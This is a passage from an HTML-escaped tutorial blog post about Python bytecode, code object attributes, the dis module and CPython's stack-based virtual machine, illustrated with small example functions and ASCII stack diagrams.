&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;almighty-bytecode&#34;&gt;Almighty bytecode&lt;/h1&gt;
&lt;p&gt;As seen in the above diagram, python source code is compiled to python bytecode which is then read by the Python Virtual Machine. This bytecode is stored in &lt;code&gt;.pyc files&lt;/code&gt;, which you can see within the &lt;code&gt;__pycache__&lt;/code&gt;
directory on python 3.6 or higher. Python generates this directory for efficiency, so that it doesn&amp;rsquo;t need to compile the source code every time you execute it.&lt;/p&gt;
&lt;h2 id=&#34;say-whaaaat&#34;&gt;Say whaaaat&lt;/h2&gt;
&lt;p&gt;Consider the following program:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maximum&lt;/span&gt;(aList):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	max &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(aList) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; aList[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; aList[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; max &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			max &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; max
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since this is a function object we can have a look at it&amp;rsquo;s attributes with: &lt;code&gt;dir(maximum)&lt;/code&gt;
The focus for us is the &lt;code&gt;__code__&lt;/code&gt; attribute, which is a code object and it contains everything python needs to execute the function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; maximum&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object maximum at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7faad2d7f920&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;stdin&amp;gt;&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So let&amp;rsquo;s look at the code object&amp;rsquo;s attributes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dir(maximum&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__class__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__delattr__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__dir__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__doc__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__eq__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__format__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__ge__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__getattribute__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__gt__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__hash__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__init__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__init_subclass__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__le__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__lt__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__ne__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__new__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__reduce__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__reduce_ex__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__repr__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__setattr__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__sizeof__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__str__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__subclasshook__&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_argcount&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_cellvars&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_code&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_consts&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_filename&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_firstlineno&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_flags&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_freevars&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_kwonlyargcount&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_lnotab&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_names&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_nlocals&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_posonlyargcount&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_stacksize&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;co_varnames&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For the purposes of this article I will focus mainly on just a few of these:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;co_varnames&lt;/code&gt;	&amp;ndash;	its local var names including parameters&lt;/li&gt;
&lt;li&gt;&lt;code&gt;co_names&lt;/code&gt;	&amp;ndash;	its global var names&lt;/li&gt;
&lt;li&gt;&lt;code&gt;co_consts&lt;/code&gt;	&amp;ndash;	its constants&lt;/li&gt;
&lt;li&gt;&lt;code&gt;co_code&lt;/code&gt;		&amp;ndash;	the actual bytecode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So for our example this would yeld:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aList&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;,)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x83\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x10&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x19\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x85\x02\x19\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;D&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x10&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;k&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r$|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;q$|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to make sense out of that bytes object we firstly need to get decimal value of the bytecode, you can do that in python with the &lt;code&gt;ord()&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ok, now we know that &lt;em&gt;t&lt;/em&gt; is decimal 116, but that didn&amp;rsquo;t help much. Luckily, there exist a module called &lt;code&gt;dis&lt;/code&gt; which makes things easier. For example we could use the &lt;code&gt;dis.opname&lt;/code&gt; which is a list that contains all the python bytecodes in a human-readeable format.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;opname[&lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LOAD_GLOBAL&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You wouldn&amp;rsquo;t want to do that every time so the &lt;code&gt;dis&lt;/code&gt; module has a convenient way to show the bytecode with &lt;code&gt;dis.dis&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dis(add)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SOURCE CODE	 BYTECODE OFFSET		INDEX IN co_varnames
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LINE NUMBER	 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; INSTRUCTION			LIST &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; IT&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S VALUE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (x)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (y)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; BINARY_ADD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some things to note here:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We can observe that each line of source code generates multiple lines of bytecode&lt;/li&gt;
&lt;li&gt;Each offset is a multiple of 2. Well why? Because, some opcodes can receive an operand such as &lt;code&gt;LOAD_FAST&lt;/code&gt;, whereas &lt;code&gt;BINARY_ADD&lt;/code&gt; doesn&amp;rsquo;t. However, since of python 3.6 every instruction will get an argument so that every opcode has 2 bytes.
&lt;em&gt;(There are cases in which the argument gets larger than 2 bytes and it will be split in multiple bytes, but it&amp;rsquo;s always going to be a multiple of 2)&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In order to make some sense out of any bytecode, we need to understand how the Python Virtual Machine &lt;em&gt;(PVM)&lt;/em&gt;* works.&lt;/p&gt;
&lt;h2 id=&#34;ok-but-how-does-python-actually-uses-bytecode&#34;&gt;Ok but how does python actually uses bytecode&lt;/h2&gt;
&lt;p&gt;The PVM is written in C and you can find it &lt;a href=&#34;https://github.com/python/cpython&#34;&gt;here&lt;/a&gt;. The most important thing to understand is that CPython is a stack-oriented virtual machine. A stack&amp;rsquo;s primary operations are load/push and store/pop. We can load/push a value on the top of an upwardly-growing stack &lt;em&gt;(incrementing the stack pointer)&lt;/em&gt; and we can store/pop a value from the top of the stack &lt;em&gt;(decrementing the stack pointer)&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;To better illustrate this let&amp;rsquo;s have a look at an example. Consider the following hypothethical instructions:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;load &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;load &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;load &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;divide
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s see how the stack behaves when each instruction is executed&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				 load 1		 load 2		   add		 load 3		 divide
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |-------|		|-------|	|-------|	|-------|	|-------|	|-------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; |		  |		|		|	|		|	|		|	|		|	|		|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |-------|		|-------|	|-------|	|-------|	|-------|	|-------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; |		  |		|		|	|	2	|	|		|	|	3	|	|		|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |-------|		|-------|	|-------|	|-------|	|-------|	|-------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; |		  |		|	1	|	|	1	|	|	3	|	|	3	|	|	1	|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  |-------|		|-------|	|-------|	|-------|	|-------|	|-------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stackp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1		stackp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0	stackp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1	stackp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0	stackp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1	stackp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, Python&amp;rsquo;s stack machine is a little bit more complicated than this hypothetical stack we created. In python:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The objects are always stored in the heap. It&amp;rsquo;s only the pointer to the object that is stored in the stack. For example let&amp;rsquo;s say we want to load 2 integers onto the stack:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	   stack			  heap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| ------- |       | -------- |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| ------- | ----- | -------- |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	|         |       |          |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| ------- |       | -------- |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| addr b  | ----&amp;gt; | val of b |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| ------- |       | -------- |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| addr a  | ----&amp;gt; | val of a |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	| ------- |       | -------- |
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The call stack is the main structure of running a python program. It has one attribute &lt;em&gt;(a frame)&lt;/em&gt; &amp;ndash; for each currently active function call. Every function call pushes a new frame onto the call stack and every time a call returns, its frame is popped off.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In each frame there are 2 stacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;the evaluation stack&lt;/strong&gt; &amp;ndash; where execution of a function&amp;rsquo;s instructions occurs&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;the block stack&lt;/strong&gt; &amp;ndash; used by python to keep track of certain types of control structures such as: loops, try/excepts blocks, with blocks. This helps python to know which blocks are active at any given moment and take action accordingly. For example, if we use the &lt;code&gt;break&lt;/code&gt; statement, the interpreter needs to know which loop to break, and that&amp;rsquo;s done with the use of the block stack.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Suppose we have the following program:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(x, y):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;y
